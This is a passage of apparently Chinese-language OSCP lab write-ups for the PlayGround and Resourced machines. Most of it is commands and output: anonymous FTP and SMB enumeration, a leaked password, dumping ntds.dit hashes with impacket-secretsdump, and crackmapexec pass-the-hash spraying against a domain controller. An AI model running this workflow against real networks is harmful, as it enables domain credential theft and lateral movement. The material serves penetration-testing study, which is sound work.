rootClogKingpinInning731","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - PlayGround","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan 80web IIS 10.0 版本没找到漏洞 21可以匿名登录，没发现有用信息 1234567891011121314151617181920212223ftp -a -A 192.168.214.65Connected to 192.168.214.65.220 Microsoft FTP Service331 Anonymous access allowed, send identity (e-mail name) as password.230 User logged in.Remote system type is Windows_NT.ftp&gt; ls200 EPRT command successful.125 Data connection already open; Transfer starting.04-29-20 09:31PM &lt;DIR&gt; ImapRetrieval02-03-25 04:44PM &lt;DIR&gt; Logs04-29-20 09:31PM &lt;DIR&gt; PopRetrieval04-29-20 09:32PM &lt;DIR&gt; Spool226 Transfer complete.ftp&gt; cd logs250 CWD command successful.ftp&gt; ls200 EPRT command successful.125 Data connection already open; Transfer starting.04-29-20 10:26PM 582 2020.04.29-delivery.log04-29-20 10:15PM 0 2020.04.29-profiler.log04-29-20 10:26PM 208 2020.04.29-smtpLog.log04-29-20 10:26PM 300 2020.04.29-xmppLog.log 445 smb需要账号密码登录 9998 smartmail foothold查看页面源码 1view-source:http://192.168.214.65:9998/interface/root#/login 123456789101112131415161718ss SmarterMail-------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------SmarterMail 16 - Arbitrary File Upload | multiple/webapps/48580.pySmarterMail 7.1.3876 - Directory Traversal | windows/remote/15048.txtSmarterMail 7.3/7.4 - Multiple Vulnerabilities | asp/webapps/16955.txtSmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities | asp/webapps/16975.txtSmarterMail &lt; 7.2.3925 - LDAP Injection | asp/webapps/15189.txtSmarterMail &lt; 7.2.3925 - Persistent Cross-Site Scripting | asp/webapps/15185.txtSmarterMail Build 6985 - Remote Code Execution | windows/remote/49216.pySmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting | asp/webapps/31017.phpsmartermail free 9.2 - Persistent Cross-Site Scripting | windows/webapps/20362.pySmarterTools SmarterMail 4.3 - &#x27;Subject&#x27; HTML Injection | php/webapps/31240.txtSmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service | windows/dos/31607.py-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 查看49216.py内容 123456789101112# Exploit Title: SmarterMail Build 6985 - Remote Code Execution# Exploit Author: 1F98D# Original Author: Soroush Dalili# Date: 10 May 2020# Vendor Hompage: re# CVE: CVE-2019-7214# Tested on: Windows 10 x64# References:# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/## SmarterMail before build 6985 provides a .NET remoting endpoint# which is vulnerable to a .NET deserialisation attack.","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Resourced","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28 categoriesAD scan all we got 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137- domainNetBIOS computer name: RESOURCEDCNetBIOS domain name: resourcedDNS domain: resourced.localFQDN: ResourceDC.resourced.localDerived membership: domain memberDerived domain: resourced[0m-osOS version: &#x27;10.0&#x27;OS release: &#x27;1809&#x27;OS build: &#x27;17763&#x27;- users username: M.Mason name: (null) acb: &#x27;0x00020010&#x27; description: Ex IT admin username: K.Keen name: (null) acb: &#x27;0x00020010&#x27; description: Frontend Developer details: username: L.Livingstone name: (null) acb: &#x27;0x00000210&#x27; description: SysAdmin username: J.Johnson name: (null) acb: &#x27;0x00020010&#x27; description: Networking specialist username: V.Ventz name: (null) acb: &#x27;0x00000210&#x27; description: &#x27;New-hired, reminder: HotelCalifornia194!&#x27; username: S.Swanson name: (null) acb: &#x27;0x00020010&#x27; description: Military Vet now cybersecurity specialist username: P.Parker name: (null) acb: &#x27;0x00020010&#x27; description: Backend Developer username: R.Robinson name: (null) acb: &#x27;0x00020010&#x27; description: Database Admin username: D.Durant name: (null) acb: &#x27;0x00020010&#x27; description: Linear Algebra and crypto god username: G.Goldberg name: (null) acb: &#x27;0x00020010&#x27; description: Blockchain expert username: Administrator name: (null) acb: &#x27;0x00000210&#x27; description: Built-in account for administering the computer/domain username: Guest name: (null) acb: &#x27;0x00000215&#x27; description: Built-in account for guest access to the computer/domain username: krbtgt name: (null) acb: &#x27;0x00020011&#x27; description: Key Distribution Center Service Account- port- 53 Simple DNS Plus- 88 kerberos-sec- 135 msrpc- 139 netbios-ssn- 445 SMB Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. Unable to connect with SMB1 -- no workgroup available- 636 / 389 LDAP [94m[*] Trying LDAP[0m [92m[+] Appears to be root/parent DC[0m [92m[+] Long domain name is: resourced.local[0m resourced.local:resourcedc$@RESOURCED.LOCAL- 464 kpasswd5?- 593 rpcdump? ncacn_http- 3268 LDAP Domain: resourced.local- 3269 tcpwrapped- 3389 ms-wbt-server Product_Version: 10.0.17763- 5985 WinRM? wsman- 9389 mc-nmf- to try1. smb 匿名登录查看信息2. user: V.Ventz HotelCalifornia194! 登录3. ldapsearch dig1234567dig @192.168.197.175 AXFR resourced.local;; Connection to 192.168.197.175#53(192.168.197.175) for resourced.local failed: timed out.;; no servers could be reached;; Connection to 192.168.197.175#53(192.168.197.175) for resourced.local failed: host unreachable.;; no servers could be reached;; Connection to 192.168.197.175#53(192.168.197.175) for resourced.local failed: host unreachable.;; no servers could be reached smbclient12345678smbclient -L 192.168.197.175 -NAnonymous login successful Sharename Type Comment --------- ---- -------Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.197.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available rpcclient12rpcclient 192.168.197.175 -NCannot connect to server. Error was NT_STATUS_LOGON_FAILURE ldapsearch1ldapsearch -H ldap://192.168.197.175 -x -b &quot;DC=resourced,DC=local&quot; |tee ldap_dump got nothing footholdhash使用user: V.Ventz HotelCalifornia194! 登录远程桌面失败，提示没有权限 使用user: V.Ventz HotelCalifornia194! 登录smb 1234567891011121314smbclient -L //192.168.197.175 -U resourced.local/V.VentzPassword for [RESOURCED.LOCAL\\V.Ventz]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Password Audit Disk SYSVOL Disk Logon server shareReconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.197.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available 在Password Audit中Active Directory和register中找到 123456789101112131415161718192021222324252627282930smbclient //192.168.197.175/Password\\ Audit -U resourced.local/V.Ventz%HotelCalifornia194!Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Tue Oct 5 16:49:16 2021 .. D 0 Tue Oct 5 16:49:16 2021 Active Directory D 0 Tue Oct 5 16:49:15 2021 registry D 0 Tue Oct 5 16:49:16 2021 7706623 blocks of size 4096. 2686980 blocks availablesmb: \\&gt; ls registerNT_STATUS_NO_SUCH_FILE listing \\registersmb: \\&gt; ls registry\\ . D 0 Tue Oct 5 16:49:16 2021 .. D 0 Tue Oct 5 16:49:16 2021 SECURITY A 65536 Mon Sep 27 18:45:20 2021 SYSTEM A 16777216 Mon Sep 27 18:45:20 2021 7706623 blocks of size 4096. 2686948 blocks availablesmb: \\&gt; ls &quot;Active Directory&quot; Active Directory D 0 Tue Oct 5 16:49:15 2021 7706623 blocks of size 4096. 2686948 blocks availablesmb: \\&gt; cd &quot;Active Directorysmb: \\Active Directory\\&gt; ls . D 0 Tue Oct 5 16:49:16 2021 .. D 0 Tue Oct 5 16:49:16 2021 ntds.dit A 25165824 Mon Sep 27 19:30:54 2021 ntds.jfm A 16384 Mon Sep 27 19:30:54 2021 7706623 blocks of size 4096. 2686948 blocks available 下载到本地，利用impacket-secretdump 提取密码 ntds.jfm 是与 ntds.dit 文件相关的日志文件，通常用于增量更新和事务日志。它是 Active Directory 中的一部分，专门用于提供对数据库的恢复功能 -ntds ntds.dit：文件本身包含用户的账户信息以及密码哈希。 -system SYSTEM：包含System注册表信息的文件（通常为 SYSTEM）。 -security SECURITY：包含Security注册表信息的文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263impacket-secretsdump -ntds ./ntds.dit -system ./Security local -system ./systemImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94[*] Reading and decrypting hashes from ./ntds.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::[*] Kerberos keys from ./ntds.ditAdministrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2Administrator:des-cbc-md5:80861f1a80f1232fRESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6aRESOURCEDC$:des-cbc-md5:ab089e317a161cc1krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631akrbtgt:des-cbc-md5:f1b602194f3713f8M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9M.Mason:des-cbc-md5:268501b50e0bf47cK.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6fK.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115K.Keen:des-cbc-md5:572cce13b38ce6daL.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8fL.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6L.Livingstone:des-cbc-md5:bf01fb23d0e6d0abJ.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087J.Johnson:des-cbc-md5:ea01d3d69d7c57f4V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28cV.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51dV.Ventz:des-cbc-md5:4af77a3d1cf7c480S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4aS.Swanson:des-cbc-md5:5d37583eae1f2f34P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cbP.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230P.Parker:des-cbc-md5:083b37079dcd764fR.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5bR.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0befR.Robinson:des-cbc-md5:7051d568dfd0852fD.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27aD.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3D.Durant:des-cbc-md5:376119bfcea815f8G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7G.Goldberg:des-cbc-md5:3e20fd1a25687673[*] Cleaning up... 尝试使用hashcat 和john破解hash, 没有结果 创建user.txt 和hash文件，利用crackmapexec 查找利用密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125crackmapexec smb 192.168.197.175 -u user.txt -H ntlm_no_user.hash --continue-on-successSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Administrator:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLEDSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\Guest:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\RESOURCEDC$:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\krbtgt:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIREDSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\M.Mason:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIREDSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\K.Keen:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [+] resourced.local\\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808SMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:980910b8fc2e4fe9d482123301dd19fe 